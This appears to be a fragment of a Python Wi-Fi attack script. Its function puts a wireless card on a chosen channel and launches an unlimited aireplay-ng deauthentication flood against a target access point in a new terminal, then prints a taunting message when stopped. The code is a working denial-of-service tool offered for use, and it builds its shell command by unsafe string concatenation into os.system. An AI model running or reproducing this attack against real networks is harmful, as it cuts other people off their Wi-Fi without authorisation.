import subprocess, re, csv, sys, os, time, shutil, argparse, threading

def airc_deauth(hacknic, hackbssid, hackchannel):    
    
    subprocess.run(["iwconfig", hacknic, "channel", hackchannel])
    
    try:
        #subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
        command = "aireplay-ng --deauth 0 -a " + hackbssid + " " + hacknic
        os.system('gnome-terminal -- ' + command)
    except KeyboardInterrupt:
        subprocess.run(["airmon-ng", "stop", hacknic])
        print("\n\n[UwU] You Get Wifucked [UwU]")

